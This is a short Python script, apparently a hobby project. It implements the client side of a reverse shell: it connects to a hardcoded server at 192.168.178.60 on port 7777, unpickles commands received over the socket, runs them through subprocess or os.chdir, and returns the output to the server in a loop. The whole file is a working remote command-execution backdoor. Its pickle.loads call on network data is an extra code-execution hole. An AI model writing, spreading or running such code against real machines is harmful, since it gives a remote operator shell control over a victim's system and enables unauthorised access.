import socket
import os
import subprocess
import pickle
import pdb
import time

#TODO
#   1. Build logic that takes the command, and actually produces
#   The result on the machine, sends the output back to the server
#   Something with OS and subprocess module || Done!

#   2.  Fix command formatting and outputt formatting so it's airtight || Crappy


#Server properties
IP = '192.168.178.60'
PORT = 7777
socket = socket.socket()

#Try to establish a connection to the server
try:
    socket.connect((IP, PORT))

except Exception as e:
    print(e)


#   --> Function to receive a command, execute it and return it
def execute(command):
    x = ""
    command = command.split()

    if command[0] == "cd":
        try:
            os.chdir(str(command[1]))
        except Exception as e:
            print(e)
            time.sleep(10)

    elif len(command) >= 2:
        x = subprocess.check_output([str(command[0]), str(command[1])])

    else:
        x = subprocess.check_output([str(command[0])])

    return x


#   --> Receive function, calls for a send function after receiving something
def recv():
    result = ""

    while True:
        try:
            print("Waiting to receive something!")
            command = pickle.loads(socket.recv(4096))
            print("Got: ", command)
            result = execute(command)
        except:
            socket.close()
            pass
        send(result)


def send(message):
    
    try:
        print("trying to send: ", message)
        socket.send(pickle.dumps(message))
        print("Send worked out!")
    except Exception as e:
        print("Send failed")
        socket.close()
        print(e)
        pass


def main():

    recv() #No need for send function, being called in receive

main()
